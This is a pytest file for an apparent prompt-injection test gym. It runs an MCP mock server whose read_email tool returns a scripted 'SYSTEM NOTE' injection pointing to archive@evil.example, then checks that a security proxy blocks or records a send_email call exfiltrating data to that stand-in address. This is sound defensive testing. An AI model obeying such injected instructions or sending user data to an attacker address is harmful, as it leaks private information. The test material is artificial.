"""The gym's toolbox, driven by a real MCP client over stdio.

Nothing here stubs the transport: the mock server runs as a subprocess
and every assertion is about what came back over the wire, because the
whole point of the mock server is that the gym's environment is real
below the proxy.
"""

import json
import os
import shlex
import subprocess
import sys
from contextlib import asynccontextmanager
from pathlib import Path

import anyio
import pytest
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

SCENARIO = Path(__file__).parent.parent / "gym" / "scenarios" / "exfil-email-01.yaml"


def params(calls_path=None, cwd=None):
    env = dict(os.environ)
    if calls_path is not None:
        env["TRIPWIRE_GYM_CALLS"] = str(calls_path)
    else:
        env.pop("TRIPWIRE_GYM_CALLS", None)
    return StdioServerParameters(
        command=sys.executable,
        args=["-m", "tripwire_gym.mock_server", str(SCENARIO)],
        env=env,
        cwd=cwd,
    )


@asynccontextmanager
async def connected(server_params):
    with anyio.fail_after(30):
        async with stdio_client(server_params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                yield session


def recorded(calls_path):
    return [json.loads(line) for line in Path(calls_path).read_text().splitlines()]


@pytest.fixture
def calls(tmp_path):
    return tmp_path / "calls.jsonl"


# --- the toolbox ---


async def test_serves_the_scenarios_tools_with_their_descriptions():
    async with connected(params()) as session:
        tools = (await session.list_tools()).tools

    by_name = {t.name: t for t in tools}
    assert set(by_name) == {"read_email", "send_email"}
    assert by_name["read_email"].description == "Read messages from a folder."
    assert by_name["send_email"].description == "Send an email."
    assert by_name["send_email"].inputSchema["properties"]["to"] == {"type": "string"}


async def test_read_email_returns_the_scripted_injection():
    async with connected(params()) as session:
        result = await session.call_tool("read_email", {"folder": "inbox"})

    assert not result.isError
    text = result.content[0].text
    assert "SYSTEM NOTE" in text
    assert "archive@evil.example" in text


async def test_send_email_returns_sent():
    async with connected(params()) as session:
        result = await session.call_tool("send_email", {"to": "a@b.com", "body": "hi"})

    assert result.content[0].text == "sent"


async def test_the_same_call_answers_the_same_thing_every_time():
    async with connected(params()) as session:
        first = await session.call_tool("read_email", {"folder": "inbox"})
        second = await session.call_tool("read_email", {"folder": "other"})

    assert first.content[0].text == second.content[0].text


async def test_unknown_tool_is_an_error_not_a_crash():
    async with connected(params()) as session:
        result = await session.call_tool("delete_everything", {})
        # the session survived it
        still_there = (await session.list_tools()).tools

    assert result.isError
    assert "delete_everything" in result.content[0].text
    assert len(still_there) == 2


# --- the ground truth file ---


async def test_calls_are_recorded_in_order_with_their_args(calls):
    async with connected(params(calls)) as session:
        await session.call_tool("read_email", {"folder": "inbox"})
        await session.call_tool("send_email", {"to": "archive@evil.example", "body": "everything"})

    lines = recorded(calls)
    assert [r["tool"] for r in lines] == ["read_email", "send_email"]
    assert lines[0]["args"] == {"folder": "inbox"}
    assert lines[1]["args"] == {"to": "archive@evil.example", "body": "everything"}
    assert lines[0]["ts"] < lines[1]["ts"]


async def test_an_unknown_tool_is_not_recorded_as_a_call(calls):
    # scoring counts what executed, and a tool that doesn't exist never did
    async with connected(params(calls)) as session:
        await session.call_tool("nope", {})
        await session.call_tool("read_email", {})

    assert [r["tool"] for r in recorded(calls)] == ["read_email"]


async def test_no_calls_path_means_nothing_is_written(tmp_path):
    async with connected(params(cwd=tmp_path)) as session:
        result = await session.call_tool("read_email", {})

    assert not result.isError
    assert list(tmp_path.iterdir()) == []


# --- bad input ---


def run_with(argument):
    return subprocess.run(
        [sys.executable, "-m", "tripwire_gym.mock_server", argument],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )


def test_a_missing_scenario_exits_with_a_message_not_a_traceback(tmp_path):
    done = run_with(str(tmp_path / "nowhere.yaml"))

    assert done.returncode != 0
    assert "nowhere.yaml" in done.stderr
    assert "Traceback" not in done.stderr


def test_a_malformed_scenario_exits_with_a_message_not_a_traceback(tmp_path):
    bad = tmp_path / "bad.yaml"
    bad.write_text("id: x\nfamily: nonsense\n")
    done = run_with(str(bad))

    assert done.returncode != 0
    assert "bad.yaml" in done.stderr
    assert "Traceback" not in done.stderr


# --- behind the real proxy ---
#
# The proxy spawns its upstream with a scrubbed environment, so
# TRIPWIRE_GYM_CALLS can't just be exported here — it has to ride in on
# the upstream command itself.

MOCK_CMD = f"{shlex.quote(sys.executable)} -m tripwire_gym.mock_server {shlex.quote(str(SCENARIO))}"


def through_proxy(tmp_path, calls, enforce=True):
    policy = tmp_path / "policy.yaml"
    mode = "" if enforce else "enforce: false\n"
    policy.write_text(f"version: 1\n{mode}defaults: {{unknown_tools: allow}}\n")
    upstream = f"/usr/bin/env TRIPWIRE_GYM_CALLS={shlex.quote(str(calls))} {MOCK_CMD}"
    return StdioServerParameters(
        command=sys.executable,
        args=[
            "-m",
            "tripwire",
            "serve",
            "--policy",
            str(policy),
            "--upstream",
            upstream,
            "--audit",
            str(tmp_path / "audit.jsonl"),
        ],
    )


async def test_the_toolbox_is_re_advertised_through_the_proxy(tmp_path, calls):
    async with connected(through_proxy(tmp_path, calls)) as session:
        tools = (await session.list_tools()).tools

    assert {t.name for t in tools} == {"read_email", "send_email"}
    assert next(t for t in tools if t.name == "send_email").description == "Send an email."


async def test_refused_calls_never_reach_the_toolbox(tmp_path, calls):
    # the policy engine is still stubbed, so everything fails closed
    async with connected(through_proxy(tmp_path, calls)) as session:
        result = await session.call_tool("send_email", {"to": "archive@evil.example"})

    assert result.isError
    assert "tripwire_blocked" in result.content[0].text
    assert not calls.exists()  # the tool was never asked


async def test_a_forwarded_call_does_reach_the_toolbox(tmp_path, calls):
    # the other half of the test above: without this, an empty calls file
    # would prove nothing about refusals
    async with connected(through_proxy(tmp_path, calls, enforce=False)) as session:
        result = await session.call_tool("send_email", {"to": "archive@evil.example"})

    assert result.content[0].text == "sent"
    assert [(r["tool"], r["args"]) for r in recorded(calls)] == [
        ("send_email", {"to": "archive@evil.example"})
    ]
